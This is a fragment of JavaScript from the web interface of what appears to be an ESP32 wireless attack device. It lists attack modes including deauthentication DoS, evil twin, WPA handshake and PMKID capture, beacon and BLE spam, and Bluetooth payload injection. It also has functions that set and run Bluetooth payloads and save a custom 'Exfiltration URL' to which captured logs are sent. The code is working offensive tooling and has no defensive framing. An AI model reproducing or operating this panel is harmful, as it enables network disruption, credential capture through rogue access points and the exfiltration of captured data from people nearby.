        case AttackTypeEnum.ATTACK_TYPE_PASSIVE:     return "Passive Capture";
        case AttackTypeEnum.ATTACK_TYPE_HANDSHAKE:   return "WPA Handshake Capture";
        case AttackTypeEnum.ATTACK_TYPE_PMKID:       return "Clientless PMKID";
        case AttackTypeEnum.ATTACK_TYPE_DOS:         return "Deauthentication (DoS)";
        case AttackTypeEnum.ATTACK_TYPE_BEACON_SPAM: return "Beacon Spam";
        case AttackTypeEnum.ATTACK_TYPE_PROBE:       return "Probe Request Spam";
        case AttackTypeEnum.ATTACK_TYPE_EVIL_TWIN:   return "Evil Twin";
        case AttackTypeEnum.ATTACK_TYPE_BT_SPAM:     return "BLE Spam";
        case AttackTypeEnum.ATTACK_TYPE_CLONE:       return "Super Clone";
        case AttackTypeEnum.ATTACK_TYPE_BT_PAYLOAD:  return "BT Payload";
        default: return "Unknown (" + t + ")";
    }
}

function setBtPayloadAndRun(payload) {
    fetch('/bt-payload-set', { method: 'POST', body: String(payload) })
    .then(function(res) {
        if (res.ok) {
            return fetch('/bt-payload-run', { method: 'POST' });
        } else {
            throw new Error("Failed to set payload");
        }
    })
    .then(function() {
        showDialog("Payload " + payload + " executed");
    })
    .catch(function(err) {
        showError("Error: " + err);
    });
}

function runBtPayloadAgain() {
    fetch('/bt-payload-run', { method: 'POST' })
    .then(function(res) {
        if (res.ok) showDialog("Re-running...");
        else showError("Could not re-run");
    })
    .catch(function(err) { showError("Network error: " + err); });
}

function updateBtStatus() {
    fetch('http://192.168.4.1/bt-status')
    .then(r => r.json())
    .then(data => {
        const statusEl = document.getElementById("bt-connection-info");
        const buttons = document.querySelectorAll(".bt-payload-btn");

        if (data.connected) {
            statusEl.innerHTML = `Connected to: <strong>${data.name}</strong> (${data.mac})`;
            statusEl.style.color = "var(--success)";
        } else {
            statusEl.textContent = "Waiting for connection...";
            statusEl.style.color = "var(--text-muted)";
        }

        // Grey out buttons if busy
        buttons.forEach(btn => {
            btn.disabled = data.busy || !data.connected;
            btn.style.opacity = (data.busy || !data.connected) ? "0.5" : "1";
        });
    });
}
function toggleCustomUrl() {
    var checkbox = document.getElementById("use-custom-url");
    var row = document.getElementById("custom-url-row");
    row.style.display = checkbox.checked ? "block" : "none";
    if (!checkbox.checked) {
        // Reset to default ESP32 endpoint
        fetch('/set-log-url', { method: 'POST', body: 'http://192.168.4.1/log' });
    } else {
        // Optionally load previously saved URL
        fetch('/get-log-url')
        .then(r => r.json())
        .then(data => {
            if (data.url && data.url !== 'http://192.168.4.1/log') {
                document.getElementById("custom-url").value = data.url;
            }
        })
        .catch(() => {});
    }
}

function saveCustomUrl() {
    var url = document.getElementById("custom-url").value.trim();
    if (!url) {
        showDialog("Please enter a valid URL");
        return;
    }
    // Basic URL validation
    if (!url.startsWith("http://") && !url.startsWith("https://")) {
        showDialog("URL must start with http:// or https://");
        return;
    }
    fetch('/set-log-url', { method: 'POST', body: url })
    .then(() => showDialog("Exfiltration URL saved"))
    .catch(() => showError("Failed to save URL"));
}

// On page load, check current settings
function loadCurrentUrl() {
    fetch('/get-log-url')
    .then(r => r.json())
    .then(data => {
        if (data.url && data.url !== 'http://192.168.4.1/log') {
            document.getElementById("use-custom-url").checked = true;
            document.getElementById("custom-url").value = data.url;
            document.getElementById("custom-url-row").style.display = "block";
        } else {
            document.getElementById("use-custom-url").checked = false;
            document.getElementById("custom-url-row").style.display = "none";
        }
    })
    .catch(() => {});
}



// Add to your init or status poll
setInterval(updateBtStatus, 2000);
